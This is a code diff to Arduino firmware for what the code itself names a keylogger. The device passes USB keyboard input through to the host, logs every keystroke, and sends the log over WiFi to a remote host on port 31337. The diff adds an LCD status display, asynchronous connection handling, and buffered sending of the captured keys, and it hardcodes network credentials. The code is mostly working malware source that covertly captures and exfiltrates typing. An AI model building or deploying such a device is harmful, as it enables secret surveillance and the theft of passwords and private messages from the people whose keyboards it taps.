@@ -1,3 +1,5 @@
+#include <LiquidCrystal.h>
+
 #include <SPI.h>
 #include <Adafruit_WINC1500.h>
 #include "CircularBuffer.h"
@@ -28,7 +30,8 @@ char ssid[] = "xXSwaggernautsXx";     //  your network SSID (name)
 char pass[] = "chillywilly";    // your network password (use for WPA, or use as key for WEP)
 int keyIndex = 0;                // your network key Index number (needed only for WEP)
 
-IPAddress host(172,20,10,8);
+IPAddress host(192,168,1,32);
+LiquidCrystal lcd(A5, A4, A3, A2, A1, A0);
 //char host[] = "www.intense.io";
 int port = 31337;
 //char *debughost = host;
@@ -41,7 +44,7 @@ int debugport = 31338;
 Adafruit_WINC1500Client client;
 Adafruit_WINC1500Client debug;
 KeyboardHandler handler;
-CircularBuffer<char> logBuffer;
+CircularBuffer<char*> logBuffer;
 
 uint32_t last_connect_attempt;
 uint32_t last_transfer_attempt;
@@ -53,6 +56,10 @@ uint8_t last_modifiers = 0;
 uint8_t keyboard_modifiers = 0;
 
 void addToLog(char *output);
+
+int line = 0;
+int statch = 0;
+char stat[] = "/|\-";
 
 inline bool isConnected() {
   return WiFi.status() == WL_CONNECTED && client.connected();
@@ -69,20 +76,30 @@ void halt() {
 
 void setup() {
 
+  lcd.begin(20,4);
+  
   #ifdef WINC_EN
   pinMode(WINC_EN, OUTPUT);
   digitalWrite(WINC_EN, HIGH);
   #endif
+
+  lcd.clear();
+    lcd.setCursor(0, line++ % 3);
+  lcd.print("Initializing");
 
   pinMode(STAT_LED, OUTPUT);
   digitalWrite(STAT_LED, HIGH);
 
   // Halt if no WiFi hardware installed
   if(WiFi.status() == WL_NO_SHIELD) {
+    lcd.setCursor(0, line++ % 3);
+    lcd.print("No shield");
     halt();
   }
 
-  handler.setLogCallback(&addToLog);
+    lcd.setCursor(0, line++ % 3);
+  lcd.print("Init USB");
+  handler.setLogCallback(addToLog);
   handler.init();
 
   // Begin serial communications with USB keyboard emulator
@@ -92,74 +109,58 @@ void setup() {
   // Assumes WPA/WPA2 network, attempt to connect
   last_connect_attempt = millis();
   connect_in_progress = true;
-  WiFi.begin(ssid, pass);
 
-  /*
-  // attempt to connect to Wifi network:
-  while (WiFi.status() != WL_CONNECTED) {
-    Serial.print("Attempting to connect to SSID: ");
-    Serial.println(ssid);
-    // Connect to WPA/WPA2 network. Change this line if using open or WEP network:
-    status = WiFi.begin(ssid, pass);
-
-    // wait 10 seconds for connection:
-    uint8_t timeout = 10;
-    while (timeout && (WiFi.status() != WL_CONNECTED)) {
-      timeout--;
-      delay(1000);
-    }
-  }
-
-  Serial.println("Connected to wifi");
-  printWifiStatus();
-
-  Serial.println("\nStarting connection to server...");
-  // if you get a connection, report back via serial:
-  if (client.connect(server, 80)) {
-    Serial.println("connected to server");
-    // Make a HTTP request:
-    client.print("GET ");
-    client.print(webpage);
-    client.println(" HTTP/1.1");
-    client.print("Host: "); client.println(server);
-    client.println("Connection: close");
-    client.println();
-  }
-  */
+  // Change below line if using unsecured or WEP network (not recommended)
+  lcd.setCursor(0, line++ % 3);
+  lcd.print("Begin connect");
+  lcd.setCursor(0, 3);
+  WiFi.beginAsync(ssid, pass);
 }
 
 void loop() {
   handler.task();
+  WiFi.refresh();
+
+  lcd.setCursor(19, 3);
+  lcd.print(stat[statch++]);
+  statch = statch % 4;
+  
   // Attempt to connect/reconnect if disconnected
   switch(WiFi.status()) {
     case WL_CONNECTED:
       if(connect_in_progress && millis() - last_connect_attempt > 5000) {
         last_connect_attempt = millis();
         if(client.connect(host, port) && debug.connect(debughost, debugport)) {
+          lcd.setCursor(0, line++ % 3);
+          lcd.print("Connected");
           connect_in_progress = false;
           digitalWrite(STAT_LED, LOW);
-          client.println("Hello");
+          client.println("Keylogger");
           printWifiStatus();
+          debug.println("Debug");
         }
       }
       break;
     case WL_IDLE_STATUS:
-      if(connect_in_progress && millis() - last_connect_attempt < 10000)
+      if(connect_in_progress && millis() - last_connect_attempt < 30000) {
         // waiting for connection timeout, do nothing
         break;
+      }
     default:
+      lcd.setCursor(0, line++ % 3);
+      lcd.print("Connection failed");
       digitalWrite(STAT_LED, HIGH);
       last_connect_attempt = millis();
       connect_in_progress = true;
-      WiFi.begin(ssid, pass);
+      WiFi.beginAsync(ssid, pass);
   }
   
   last_transfer_attempt = millis();
-  /*
-  while(isConnected() && logBuffer.getNumEntries() > 0 && millis() - last_transfer_attempt < max_transfer_time) {
-      debug.write(logBuffer.removeFirst());
+  if(isConnected() && logBuffer.getNumEntries() > 0) {
+    char *str = logBuffer.peek();
+    size_t err = debug.writeAsync((uint8_t*)str, strlen(str));
+    if(err >= 0) logBuffer.remove();
   }
-  */
   /*
   while(logBuffer.getNumEntries() > 0) {
     debug.write(logBuffer.removeFirst());
@@ -212,7 +213,7 @@ void controlKeysChanged() {
 }
 
 void keyPressed() {
-  //handler.pressed();
+  handler.pressed(handler.getOemKey() & 0xff);
   uint8_t cmd = (uint8_t) (CMD_PRESS & 0xFF);
   Serial1.write(cmd);
   int key = handler.getOemKey();
@@ -223,7 +224,7 @@ void keyPressed() {
   Serial1.write(buf[1]);
 }
 void keyReleased() {
-  //handler.released();
+  handler.released(handler.getOemKey() & 0xff);
   uint8_t cmd = (uint8_t) (CMD_RELEASE & 0xFF);
   Serial1.write(cmd);
   int key = handler.getOemKey();
@@ -235,7 +236,6 @@ void keyReleased() {
 }
 
 void addToLog(char *output) {
-  debug.write(output, strlen(output));
-  debug.flush();
+  logBuffer.add(output);
 }
 
